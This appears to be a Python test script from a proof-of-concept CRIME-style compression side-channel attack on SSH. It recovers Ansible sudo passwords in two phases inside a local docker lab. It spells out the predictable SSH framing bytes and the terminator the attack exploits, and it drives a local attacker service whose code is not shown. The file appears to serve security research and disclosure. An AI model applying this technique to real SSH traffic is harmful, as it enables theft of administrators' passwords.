"""End-to-end two-phase CRIME attack against an Ansible sudo password.

Run from the host while the docker-compose stack is up:

    python scripts/test_attack_ansible.py

For each target password:

  Phase 1 -- recover the CHANNEL_DATA length byte using the 8 bytes
  of SSH framing that precede the password in the c->s zlib stream:

      \\x5e \\x00\\x00\\x00\\x00 \\x00\\x00\\x00  <length_byte>

  Phase 2 -- recover the password byte-by-byte using the now-fully-
  known 9-byte prefix.  The trailing newline Ansible appends to the
  password is the natural Phase-2 terminator.

The test harness sets the sudo password by calling /set_sudo_secret
(which SSHes to the server as root and runs chpasswd), then drives
/run_attack_ansible on the attacker in two phases and verifies the
recovered value matches what was planted.
"""

from __future__ import annotations

import json
import sys
import time
import urllib.error
import urllib.request

ATTACKER_BASE = "http://127.0.0.1:9000"
CLIENT_BASE = "http://127.0.0.1:8000"

# Phase 1 constants -----------------------------------------------------------
# 8 fully-predictable bytes: SSH_MSG_CHANNEL_DATA (0x5e) + recipient
# channel 0 (uint32) + the zero-high-bytes of the uint32 data length.
PHASE1_PREFIX = "\x5e\x00\x00\x00\x00\x00\x00\x00"
# Plausible length bytes: 1..32.  Ansible writes password + "\n" so the
# length byte equals len(password)+1; this alphabet covers passwords up
# to 31 characters.  Terminator is \x00 (not in the alphabet), so the
# attack recovers exactly one byte.
PHASE1_ALPHABET = "".join(chr(i) for i in range(1, 33))
PHASE1_TERMINATOR = "\x00"

# Phase 2 constants -----------------------------------------------------------
# Password character set: lowercase alphanumerics.  Matches the other
# variants' default alphabet so the three test harnesses are consistent.
PW_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"
# Terminator: '\n'.  Ansible appends a single LF to the password before
# writing it to ssh's stdin, so the last byte of the CHANNEL_DATA data
# field is always 0x0a.
PHASE2_TERMINATOR = "\n"

TEST_SECRETS = [
    "hunter2",
    "correcthorse",
    "pa55word",
    "letmein9",
    "tr0ub4dor",
]


def http(method: str, url: str, body: bytes | None = None,
         content_type: str | None = None, timeout: float = 7200.0) -> dict:
    headers = {}
    if content_type:
        headers["Content-Type"] = content_type
    req = urllib.request.Request(url, method=method, data=body, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        raw = resp.read()
    if not raw:
        return {}
    return json.loads(raw)


def set_sudo_secret(value: str) -> None:
    body = json.dumps({"value": value}).encode("utf-8")
    http("POST", f"{CLIENT_BASE}/set_sudo_secret", body=body,
         content_type="application/json")


def run_attack(known_prefix: str, alphabet: str, max_length: int,
               terminator: str, min_margin: int = 8,
               max_rounds: int = 96) -> dict:
    body = json.dumps({
        "known_prefix": known_prefix,
        "alphabet": alphabet,
        "max_length": max_length,
        "terminator": terminator,
        "min_margin": min_margin,
        "max_rounds": max_rounds,
    }).encode("utf-8")
    return http("POST", f"{ATTACKER_BASE}/run_attack_ansible", body=body,
                content_type="application/json")


def recover_password(secret_len_hint: int) -> tuple[str, float]:
    """Two-phase Ansible attack: recover length byte, then password."""
    t0 = time.time()

    # Phase 1 -- recover the CHANNEL_DATA data-length byte.
    print("    phase 1: recovering CHANNEL_DATA length byte...")
    result1 = run_attack(
        known_prefix=PHASE1_PREFIX,
        alphabet=PHASE1_ALPHABET,
        max_length=1,
        terminator=PHASE1_TERMINATOR,
    )
    length_str = result1["recovered"]
    if len(length_str) != 1:
        raise RuntimeError(
            f"Phase 1 recovered {length_str!r}, expected a single byte"
        )
    length_byte_int = ord(length_str[0])
    password_length = length_byte_int - 1  # subtract the trailing \n
    print(f"    phase 1: length byte = 0x{length_byte_int:02x} "
          f"(password length = {password_length}) "
          f"({result1['elapsed_seconds']:.1f}s)")

    # Phase 2 -- recover the password using the now fully-known 9-byte
    # prefix: CHANNEL_DATA header + length byte.
    phase2_prefix = PHASE1_PREFIX + length_str
    result2 = run_attack(
        known_prefix=phase2_prefix,
        alphabet=PW_ALPHABET,
        max_length=password_length + 4,
        terminator=PHASE2_TERMINATOR,
    )
    # The recovered string ends with a trailing newline terminator; strip
    # it because the planted password doesn't include it.
    password = result2["recovered"].rstrip("\n")
    elapsed = time.time() - t0
    print(f"    phase 2: password = {password!r} "
          f"({result2['elapsed_seconds']:.1f}s)")

    return password, elapsed


def main() -> int:
    print("CRIME-on-SSH PoC: Ansible variant two-phase attack test")
    print(f"Phase 1 prefix (hex): {PHASE1_PREFIX.encode('latin-1').hex()}")
    print(f"Phase 2 terminator: {PHASE2_TERMINATOR!r}  (Ansible's trailing \\n)")
    print(f"Test secrets: {TEST_SECRETS}")
    print()

    results = []
    for idx, secret in enumerate(TEST_SECRETS, 1):
        print("=" * 72)
        print(f"  [{idx}/{len(TEST_SECRETS)}] target sudo password = {secret!r}")
        print("=" * 72)
        set_sudo_secret(secret)
        time.sleep(1.0)

        try:
            recovered, elapsed = recover_password(len(secret))
        except Exception as exc:  # noqa: BLE001
            recovered = f"<error: {exc!s}>"
            elapsed = 0.0
        ok = recovered == secret
        status = "PASS" if ok else "FAIL"

        print(f"    recovered: {recovered!r}")
        print(f"    expected:  {secret!r}")
        print(f"    total:     {elapsed:.1f}s")
        print(f"    status:    {status}")
        print()
        results.append((secret, recovered, ok, elapsed))

    print("=" * 72)
    print("  SUMMARY")
    print("=" * 72)
    print(f"  {'expected':<16} {'recovered':<16} {'time':<10} status")
    print(f"  {'-'*16} {'-'*16} {'-'*10} ------")
    for secret, recovered, ok, elapsed in results:
        status = "PASS" if ok else "FAIL"
        print(f"  {secret:<16} {recovered:<16} {elapsed:>6.1f}s    {status}")

    n_pass = sum(1 for _, _, ok, _ in results if ok)
    print()
    print(f"  {n_pass}/{len(results)} tests passed")
    return 0 if n_pass == len(results) else 1


if __name__ == "__main__":
    sys.exit(main())
